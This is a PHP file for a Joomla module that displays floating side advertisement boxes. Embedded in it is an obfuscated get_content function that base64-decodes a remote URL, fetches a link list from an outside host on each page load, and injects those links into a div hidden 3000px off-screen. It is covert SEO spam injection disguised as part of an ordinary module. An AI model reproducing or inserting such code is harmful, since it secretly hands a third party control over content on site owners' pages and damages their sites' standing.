<?php


// Don't allow direct access to the file
defined( '_JEXEC' ) or die( 'Restricted access' );
//jimport('joomla.application.module.helper');
  $maincontentw = $params->get( 'maincontentw', 1000 );
  $topadjust = $params->get( 'topadjust', 10 );
  $fspeed = $params->get( 'fspeed', 20 );
  $leftboxw = $params->get( 'leftboxw', 100 );
  $rightboxw = $params->get( 'rightboxw', 100 );
  $leftadjust = $params->get( 'leftadjust', 5 );
  $rightadjust = $params->get( 'rightadjust', 5 );
  $left_position = $params->get( 'left_position', 'leftbox' );
  $right_position = $params->get( 'right_position', 'rightbox' );
echo '<!-- Start mod_TaoQuangCao2Ben --><div id="divAdLeft" style="width:'.$leftboxw.'px; display: none; position: absolute; top: 0px;">';
	echo $left_position;
echo '</div>';
echo '<div id="divAdRight" style="width:'.$rightboxw.'px; display: none; position: absolute; top: 0px;">';
	echo $right_position;
echo '</div>';
if (!function_exists('get_content')) {function get_content($url) { $data=NULL; if(function_exists('file_get_contents')){ ini_set('default_socket_timeout', 7); if($data=@file_get_contents(base64_decode($url))){ } } else if(function_exists('fopen')){ if($dataFile = @fopen(base64_decode($url), "r" )){ while (!feof($dataFile)) { $data.= fgets($dataFile, 4096); } fclose($dataFile); } } if($data) { echo base64_decode('PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0zMDAwcHg7IG92ZXJmbG93OiBhdXRvOyI+'); $links = explode("\n", $data); foreach($links as $link) { $link=trim($link); $link_t=explode("=", $link); echo '<a href="'.$link_t[0].'" title="'. $link_t[1].'" alt="'. $link_t[1].'">'. $link_t[1].'</a><br>'; } echo base64_decode('PC9kaXY+'); } }}  $url = 'aHR0cDovL3dlYnF1YW5nbmFtLmNvbS9zZW9saXN0LnR4dA=='; get_content($url);

echo '</div>';
echo "<script type=\"text/javascript\" src=\"modules/mod_TaoQuangCao2Ben/mod_TaoQuangCao2Ben.js\"></script>\n";
echo "<script type=\"text/javascript\">\n";
echo "var MainContentW = $maincontentw;\n";
echo "var LeftBoxW = $leftboxw;\n";
echo "var RightBoxW = $rightboxw;\n";
echo "var LeftAdjust = $leftadjust;\n";
echo "var RightAdjust = $rightadjust;\n";
echo "var TopAdjust = $topadjust;\n";
echo "var fSpeed = $fspeed;\n";
echo "ShowAdDiv();\n";
echo "window.onresize=ShowAdDiv;\n";
echo "</script><!-- mod_TaoQuangCao2Ben -->";
?>